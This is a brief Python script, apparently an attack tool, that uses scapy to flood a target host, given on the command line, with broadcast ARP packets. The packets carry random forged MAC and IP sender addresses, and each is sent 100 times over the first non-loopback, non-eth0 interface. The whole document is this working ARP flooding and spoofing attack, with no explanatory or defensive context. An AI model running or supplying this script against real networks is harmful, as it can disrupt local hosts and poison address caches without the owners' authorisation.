import scapy.all as scapy 
from scapy.all import * 
from scapy.layers.l2 import Ether 
from scapy.layers.l2 import ARP 
import sys 


def pingen(qp,ifa,hServerIP): 
    for i in range(qp): 
        r=RandMAC()._fix() 
        i=RandIP()._fix() 
        packet = Ether(dst='ff:ff:ff:ff:ff:ff',src=r,type=0x0806) / ARP(hwsrc=r ,psrc= i,pdst=hServerIP,type=0x0806) 
        sendp(packet, count=100,iface=ifa) 

  
hServerIP = sys.argv[1] 
qp = int(sys.argv[2]) 
ifs=os.listdir('/sys/class/net/') 

for i in ifs: 
    if i != 'lo' and i != 'eth0': 
        pingen(qp,i, hServerIP) 
        print(i) 
        break  